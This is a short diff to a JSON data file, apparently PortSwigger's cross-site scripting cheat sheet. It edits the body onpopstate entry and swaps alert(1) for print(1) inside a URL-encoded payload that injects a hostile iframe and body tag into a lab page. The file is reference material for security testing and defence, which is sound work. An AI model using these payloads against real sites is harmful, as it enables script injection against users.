@@ -14082,7 +14082,7 @@
             {
                 "tag": "body",
                 "code": "<body onpopstate=print()>",
-                "url": "http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php?x=%3Ciframe%20onload%3D%22if%28%21window.flag%29%7Bthis.contentWindow.location%3D%27https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cbody%20onpopstate%3Dalert%281%29%3E%23%27%3Bflag%3D1%7D%22%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cbody%20onpopstate%3Dprint%281%29%3E%22%3E%3C%2Fiframe%3E",
+                "url": "http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php?x=%3Ciframe%20onload%3D%22if%28%21window.flag%29%7Bthis.contentWindow.location%3D%27https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cbody%20onpopstate%3Dprint%281%29%3E%23%27%3Bflag%3D1%7D%22%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cbody%20onpopstate%3Dprint%281%29%3E%22%3E%3C%2Fiframe%3E",
                 "browsers": [
                     "chrome",
                     "firefox",
